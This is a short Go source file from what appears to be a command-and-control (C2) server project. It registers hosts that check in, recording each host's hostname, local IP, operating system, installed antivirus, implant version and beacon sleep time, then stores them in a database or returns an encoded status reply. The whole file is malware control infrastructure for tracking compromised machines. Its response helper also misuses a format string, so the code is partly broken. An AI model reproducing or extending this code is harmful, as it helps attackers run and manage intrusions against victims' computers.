package clientApi

import (
	"C2-Server/sql3"
	json2 "encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"net/http"
)

type HostList struct {
	Uuid      string `json:"uuid"`
	Hostname  string `json:"hostname"`
	Localip   string `json:"localip"`
	Os        string `json:"os"`
	Av        string `json:"av"`
	Version   string `json:"version"`
	Sleeptime string `json:"sleeptime"`
}

func AddHosts(c *gin.Context, b HostList) {
	ip := c.ClientIP()
	fmt.Println(b)
	addhost := sql3.HostLists{Uuid: b.Uuid, Hostname: b.Hostname, Localip: b.Localip, Os: b.Os, Av: b.Av, Version: b.Version, Sleep_time: b.Sleeptime, Ip: ip}
	if sql3.AuthHost(addhost) {
		sql3.AddHost(addhost)
		c.String(http.StatusOK, "ok")
	} else {
		s := GetDatademo("")
		bc := EncodeStr(b.Uuid, string(s))
		c.String(500, bc)
	}
}
func GetDatademo(s string) []byte { //编码json加密传输
	jsonByte, _ := json2.Marshal(s)
	jsonStr := string(jsonByte)
	a := `{"status":  "200",
			"msgtype": "online"
			}`
	content := []byte(fmt.Sprintf(a, jsonStr))
	//fmt.Println(jsonStr)
	return content
}
